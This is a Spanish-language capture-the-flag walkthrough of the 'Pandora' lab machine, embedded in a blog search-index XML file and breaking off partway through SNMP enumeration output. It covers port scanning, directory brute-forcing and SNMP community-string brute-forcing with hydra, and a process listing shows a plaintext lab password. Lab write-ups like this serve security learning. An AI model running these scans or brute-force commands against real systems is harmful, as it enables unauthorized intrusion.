<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pandora</title>
    <link href="/2022/03/31/Pandora/"/>
    <url>/2022/03/31/Pandora/</url>
    
    <content type="html"><![CDATA[<h1 id="THM-Pandora-Walktrhough"><a href="#THM-Pandora-Walktrhough" class="headerlink" title="THM - Pandora Walktrhough"></a>THM - Pandora Walktrhough</h1><h2 id="Task-1-Reconocimiento"><a href="#Task-1-Reconocimiento" class="headerlink" title="Task 1 - Reconocimiento"></a>Task 1 - Reconocimiento</h2><h3 id="1-Escanear-todos-los-puertos-TCP-abiertos-y-las-versiones-de-los-servicios-corriendo"><a href="#1-Escanear-todos-los-puertos-TCP-abiertos-y-las-versiones-de-los-servicios-corriendo" class="headerlink" title="1. Escanear todos los puertos TCP abiertos y las versiones de los servicios corriendo:"></a>1. Escanear todos los puertos TCP abiertos y las versiones de los servicios corriendo:</h3><h4 id="1-1-Utilizando-nmap"><a href="#1-1-Utilizando-nmap" class="headerlink" title="1.1 Utilizando nmap"></a>1.1 Utilizando nmap</h4><p>La primera tarea de todas para realizar un ataque es detectar los puertos y servicios expuestos. Esta tarea se suele realizar con el comando:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV -n -p- pandora.htb<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> pandora.htb<br>Host is up (0.073s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)<br>|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)<br>|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Play | Landing<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><h4 id="1-2-Utilizando-fast-scan-sh"><a href="#1-2-Utilizando-fast-scan-sh" class="headerlink" title="1.2 Utilizando fast_scan.sh"></a>1.2 Utilizando fast_scan.sh</h4><p>Script fast_scan.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span><br>        ip=<span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span><br>                timeout 1 bash -c <span class="hljs-string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$port</span> TCP is OPEN[*]&quot;</span> &amp;<br>        <span class="hljs-keyword">done</span>; <span class="hljs-built_in">wait</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n[*] Use: ./fast_scan.sh pandora.htb\n&quot;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fast_scan.sh pandora.htb<br></code></pre></td></tr></table></figure><p>Output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Port 22 TCP is OPEN[*]<br>Port 80 TCP is OPEN[*]<br></code></pre></td></tr></table></figure><h3 id="2-Investigar-puerto-80-TCP-web"><a href="#2-Investigar-puerto-80-TCP-web" class="headerlink" title="2. Investigar puerto 80 TCP (web)"></a>2. Investigar puerto 80 TCP (web)</h3><h4 id="2-1-Analizar-web-y-codigo-fuente"><a href="#2-1-Analizar-web-y-codigo-fuente" class="headerlink" title="2.1 Analizar web y código fuente"></a>2.1 Analizar web y código fuente</h4><p>Si accedemos a la <a href="http://pandora.htb/">http://pandora.htb</a>, veremos la siguiente web.</p><p><img src="/img/Walkthrough/HTB/Pandora/play.png" alt="Figura 1: Enumeración SNMP"></p><p>Después de toquetear todas las opciones, estas son mis conclusiones:</p><ul><li>Los botones no redirigen a ninguna URL de interés.</li><li>El formulario envia los datos por método GET (se puede ver en la URL una vez le hemos dado al botón de Submit).</li></ul><h4 id="2-2-Busqueda-de-directorios"><a href="#2-2-Busqueda-de-directorios" class="headerlink" title="2.2 Busqueda de directorios"></a>2.2 Busqueda de directorios</h4><p>Con la herramienta Gobuster, he buscado subdirectorios disponibles.</p><p>Input</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dir -u http://pandora.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100<br></code></pre></td></tr></table></figure><p>Output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://pandora.htb<br>[+] Method:                  GET<br>[+] Threads:                 100<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/assets               (Status: 301) [Size: 313] [--&gt; http://pandora.htb/assets/]<br>/server-status        (Status: 403) [Size: 277]                                  <br>                                                                                 <br>===============================================================<br></code></pre></td></tr></table></figure><p>Finalmente, después de leer la información de los ficheros, no se encontró nada de interés.</p><h3 id="3-Escanear-todos-los-puertos-UDP-abiertos-y-las-versiones-de-los-servicios-corriendo"><a href="#3-Escanear-todos-los-puertos-UDP-abiertos-y-las-versiones-de-los-servicios-corriendo" class="headerlink" title="3. Escanear todos los puertos UDP abiertos y las versiones de los servicios corriendo"></a>3. Escanear todos los puertos UDP abiertos y las versiones de los servicios corriendo</h3><p>Se deben escanear los puertos UDP cuando no encontramos información de utilidad en los puertos TCP. Este tipo de escaneo requiere de privilegios SUDO y aumenta drásticamente el tiempo del escaneo. Se recomienda utilizar la flag <strong>-top-ports</strong> para reducir el tiempo y tener una primera visión de los servicios expuestos.</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU -sV -n --open --top-ports 1000 --min-rate 5000 pandora.htb<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> pandora.htb<br>Host is up (0.069s latency).<br><br>PORT    STATE SERVICE VERSION<br>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)<br>Service Info: Host: pandora<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.11 seconds<br></code></pre></td></tr></table></figure><p>Al ver que tenemos el servicio <strong>snmp</strong> abierto en el puerto 161, toca investigar sobre técnicas de enumeración de dicho servicio. Os dejo el siguiente enlace por si os sirviera de ayuda: <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">https://book.hacktricks.xyz/pentesting/pentesting-snmp</a></p><p><img src="/img/Walkthrough/HTB/Pandora/Enumeration_snmp.png" alt="Figura 1: Enumeración SNMP"></p><h4 id="3-1-Metodo-lento-Ejecutar-todos-los-scripts-de-nmap-para-el-puerto-161-snmp"><a href="#3-1-Metodo-lento-Ejecutar-todos-los-scripts-de-nmap-para-el-puerto-161-snmp" class="headerlink" title="3.1. (Método lento) Ejecutar todos los scripts de nmap para el puerto 161 - snmp"></a>3.1. (Método lento) Ejecutar todos los scripts de nmap para el puerto 161 - snmp</h4><p>Dado que el output utilizando la herramienta <strong>nmap</strong> es un resultado gigante, os lo dejo explicado como se haría pero que sea fácil para el lector poder saltar a la siguiente sección.</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU -sC -sV -n -p161 pandora.htb<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> pandora.htb<br>Host is up (0.044s latency).<br><br>PORT    STATE SERVICE VERSION<br>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)<br>| snmp-processes: <br>|   1: <br>|     Name: systemd<br>|     Path: /sbin/init<br>|     Params: maybe-ubiquity<br>|   2: <br>|     Name: kthreadd<br>|   3: <br>|     Name: rcu_gp<br>|   4: <br>|     Name: rcu_par_gp<br>|   6: <br>|     Name: kworker/0:0H-kblockd<br>|   9: <br>|     Name: mm_percpu_wq<br>|   10: <br>|     Name: ksoftirqd/0<br>.<br>.<br>.<br>|   801: <br>|     Name: cron<br>|     Path: /usr/sbin/cron<br>|     Params: -f<br>|   803: <br>|     Name: cron<br>|     Path: /usr/sbin/CRON<br>|     Params: -f<br>|   819: <br>|     Name: sh<br>|     Path: /bin/sh<br>|     Params: -c sleep 30; /bin/bash -c <span class="hljs-string">&#x27;/usr/bin/host_check -u daniel -p HotelBabylon23&#x27;</span><br>|   826: <br>|     Name: atd<br>|     Path: /usr/sbin/atd<br>|     Params: -f<br>|   827: <br>|     Name: snmpd<br>|     Path: /usr/sbin/snmpd<br>|     Params: -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid<br>|   828: <br>|     Name: sshd<br>|     Path: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<br>.<br>.<br>.<br>|   109708: <br>|     Name: sshd<br>|     Path: sshd: daniel [priv]<br>|   109793: <br>|     Name: sshd<br>|     Path: sshd: daniel@pts/0<br>|   109794: <br>|     Name: bash<br>|_    Path: -bash<br>| snmp-win32-software: <br>|   accountsservice_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:21<br>|   adduser_3.118ubuntu2_all; 2021-02-01T17:21:32<br>|   alsa-topology-conf_1.2.2-1_all; 2021-02-01T17:25:18<br>|   alsa-ucm-conf_1.2.2-1ubuntu0.11_all; 2021-12-07T12:57:25<br>|   amd64-microcode_3.20191218.1ubuntu1_amd64; 2021-06-11T12:44:07<br>|   apache2-bin_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07<br>|   apache2-data_2.4.41-4ubuntu3.8_all; 2021-12-07T12:57:07<br>|   apache2-utils_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07<br>|   apache2_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:06<br>.<br>.<br>.<br>|   zerofree_1.1.1-1_amd64; 2021-02-01T17:26:25<br>|   zip_3.0-11build1_amd64; 2021-06-11T13:55:09<br>|_  zlib1g_1:1.2.11.dfsg-2ubuntu1.2_amd64; 2021-02-01T17:24:00<br>| snmp-interfaces: <br>|   lo<br>|     IP address: 127.0.0.1  Netmask: 255.0.0.0<br>|     Type: softwareLoopback  Speed: 10 Mbps<br>|     Traffic stats: 6.02 Mb sent, 6.02 Mb received<br>|   VMware VMXNET3 Ethernet Controller<br>|     IP address: pandora.htb  Netmask: 255.255.254.0<br>|     MAC address: 00:50:56:b9:5f:4d (VMware)<br>|     Type: ethernetCsmacd  Speed: 4 Gbps<br>|_    Traffic stats: 69.07 Mb sent, 36.36 Mb received<br>| snmp-info: <br>|   enterprise: net-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: 48fa95537765c36000000000<br>|   snmpEngineBoots: 30<br>|_  snmpEngineTime: 6h28m17s<br>| snmp-sysdescr: Linux pandora 5.4.0-91-generic <span class="hljs-comment">#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64</span><br>|_  System uptime: 6h28m17.52s (2329752 timeticks)<br>| snmp-netstat: <br>|   TCP  0.0.0.0:22           0.0.0.0:0<br>|   TCP  pandora.htb:22      10.10.16.19:57856<br>|   TCP  pandora.htb:22      10.10.16.40:52580<br>|   TCP  pandora.htb:22      10.10.16.40:52582<br>|   TCP  127.0.0.1:3306       0.0.0.0:0<br>|   TCP  127.0.0.53:53        0.0.0.0:0<br>|   UDP  0.0.0.0:161          *:*<br>|_  UDP  127.0.0.53:53        *:*<br>Service Info: Host: pandora<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 257.13 seconds<br></code></pre></td></tr></table></figure><h4 id="3-2-Metodo-rapido-Utilizar-snmp-check"><a href="#3-2-Metodo-rapido-Utilizar-snmp-check" class="headerlink" title="3.2. (Método rápido) Utilizar snmp-check"></a>3.2. (Método rápido) Utilizar snmp-check</h4><p><strong>snmp-check</strong> es una herramienta optimizada para la enumeración de la información importante del servicio snmp. Para poder utilizarla, deberemos:</p><h5 id="3-2-1-Instalacion-de-la-herramienta"><a href="#3-2-1-Instalacion-de-la-herramienta" class="headerlink" title="3.2.1 Instalación de la herramienta"></a>3.2.1 Instalación de la herramienta</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install snmp-mibs-downloader<br>download-mibs<br></code></pre></td></tr></table></figure><h5 id="3-2-2-Obtener-la-community-string-por-fuerza-bruta"><a href="#3-2-2-Obtener-la-community-string-por-fuerza-bruta" class="headerlink" title="3.2.2 Obtener la community string por fuerza bruta"></a>3.2.2 Obtener la community string por fuerza bruta</h5><p>Según la documentación anterior, para poder utilizar la herramienta <strong>snmp-check</strong>, primero deberemos obtener la <strong>community string</strong> con uno de los siguientes comandos: <a href="https://book.hacktricks.xyz/brute-force#snmp">https://book.hacktricks.xyz/brute-force#snmp</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf&gt; use auxiliary/scanner/snmp/snmp_login<br>nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]<br>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt pandora.htb<br>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp<br></code></pre></td></tr></table></figure><p>Yo personalmente he utilizado el comando de hydra y he obtenido el siguiente resultado:</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt pandora.htb snmp<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-31 20:30:08<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task<br>[DATA] attacking snmp://pandora.htb:161/<br>[161][snmp] host: pandora.htb   password: public<br></code></pre></td></tr></table></figure><h5 id="3-2-3-Enumerar-con-snmp-check"><a href="#3-2-3-Enumerar-con-snmp-check" class="headerlink" title="3.2.3 Enumerar con snmp-check"></a>3.2.3 Enumerar con snmp-check</h5><p>Anteriormente, hemos obtenido que el servicio snmp utiliza la Community String <strong>public</strong>. Ahora simplemente tenemos que utilizar el comando tal como se nos indica:</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmp-check pandora.htb -p 161 -c public<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmp-check v1.9 - SNMP enumerator<br>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)<br><br>[+] Try to connect to pandora.htb:161 using SNMPv1 and community <span class="hljs-string">&#x27;public&#x27;</span><br><br>[*] System information:<br><br>  Host IP address               : pandora.htb<br>  Hostname                      : pandora<br>  Description                   : Linux pandora 5.4.0-91-generic <span class="hljs-comment">#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64</span><br>  Contact                       : Daniel<br>  Location                      : Mississippi<br>  Uptime snmp                   : 01:00:57.78<br>  Uptime system                 : 01:00:45.85<br>  System date                   : 2022-3-31 13:02:36.0<br><br>[*] Network information:<br><br>  IP forwarding enabled         : no<br>  Default TTL                   : 64<br>  TCP segments received         : 108984<br>  TCP segments sent             : 122507<br>  TCP segments retrans          : 11061<br>  Input datagrams               : 245128<br>  Delivered datagrams           : 120547<br>  Output datagrams              : 143960<br><br>[*] Network interfaces:<br><br>  Interface                     : [ up ] lo<br>  Id                            : 1<br>  Mac Address                   : :::::<br>  Type                          : softwareLoopback<br>  Speed                         : 10 Mbps<br>  MTU                           : 65536<br>  In octets                     : 3317218<br>  Out octets                    : 3317218<br><br>  Interface                     : [ up ] VMware VMXNET3 Ethernet Controller<br>  Id                            : 2<br>  Mac Address                   : 00:50:56:b9:04:b3<br>  Type                          : ethernet-csmacd<br>  Speed                         : 4294 Mbps<br>  MTU                           : 1500<br>  In octets                     : 14811602<br>  Out octets                    : 11036587<br><br><br>[*] Network IP:<br><br>  Id                    IP Address            Netmask               Broadcast           <br>  2                     pandora.htb          255.255.254.0         1                   <br>  1                     127.0.0.1             255.0.0.0             0                   <br><br>[*] Routing information:<br><br>  Destination           Next hop              Mask                  Metric              <br>  0.0.0.0               10.10.10.2            0.0.0.0               1                   <br>  10.10.10.0            0.0.0.0               255.255.254.0         0                   <br><br>[*] TCP connections and listening ports:<br><br>  Local address         Local port            Remote address        Remote port           State               <br>  0.0.0.0               22                    0.0.0.0               0                     listen              <br>  pandora.htb          22                    10.10.16.19           57868                 established         <br>  pandora.htb          50632                 1.1.1.1               53                    synSent             <br>  pandora.htb          59972                 10.10.16.19           1234                  timeWait            <br>  pandora.htb          60246                 10.10.16.19           1337                  closeWait           <br>  127.0.0.1             3306                  0.0.0.0               0                     listen              <br>  127.0.0.1             45062                 127.0.0.1             80                    finWait2            <br>  127.0.0.1             56032                 127.0.0.1             80                    established         <br>  127.0.0.53            53                    0.0.0.0               0                     listen              <br><br>[*] Listening UDP ports:<br><br>  Local address         Local port          <br>  0.0.0.0               161                 <br>  127.0.0.53            53                  <br><br>[*] Processes:<br><br>  Id                    Status                Name                  Path                  Parameters          <br>  1                     runnable              systemd               /sbin/init            maybe-ubiquity      <br>  2                     runnable              kthreadd                                                        <br>  3                     unknown               rcu_gp                                                          <br>  4                     unknown               rcu_par_gp                                                      <br>  6                     unknown               kworker/0:0H-kblockd                                            <br>  9                     unknown               mm_percpu_wq                                                    <br>  10                    runnable              ksoftirqd/0                                                     <br>  .<br>  .<br>  .                       <br>  771                   runnable              accounts-daemon       /usr/lib/accountsservice/accounts-daemon                      <br>  793                   runnable              cron                  /usr/sbin/cron        